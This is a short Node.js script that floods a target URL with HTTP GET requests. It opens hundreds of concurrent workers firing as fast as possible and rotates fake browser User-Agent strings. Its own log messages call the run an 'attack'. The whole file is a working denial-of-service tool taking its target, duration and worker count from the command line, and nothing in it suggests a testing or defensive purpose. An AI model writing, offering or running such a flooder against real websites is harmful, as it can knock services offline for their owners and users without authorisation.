const https = require('https');
const http = require('http');
const { URL } = require('url');

// List of user agents
const userAgents = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/88.0",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Mobile/15E148 Safari/604.1",
];

// Command line arguments
const target = process.argv[2]; // Target URL
const seconds = parseInt(process.argv[3], 10) || 10; // Duration in seconds
const workers = parseInt(process.argv[4], 10) || 500; // Number of concurrent workers

if (!target) {
  console.error('Target URL is required');
  process.exit(1);
}

// Function to send HTTP requests
function sendRequest() {
  const client = target.startsWith('https') ? https : http;
  const url = new URL(target);

  const options = {
    hostname: url.hostname,
    path: url.pathname,
    method: 'GET',
    headers: {
      'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)],
    },
  };

  const req = client.request(options, (res) => {
    res.on('data', () => {});
    res.on('end', () => {});
  });

  req.on('error', () => {});
  req.end();
}

// Worker function to send requests concurrently
function startWorkers() {
  for (let i = 0; i < workers; i++) {
    setInterval(() => sendRequest(), 0); // Send requests as fast as possible
  }
}

// Start the attack
console.log(`Starting attack on ${target} for ${seconds} seconds with ${workers} workers.`);

// Start the worker tasks
startWorkers();

// Stop after the specified time duration
setTimeout(() => {
  console.log('Attack completed');
  process.exit(0);
}, seconds * 1000);

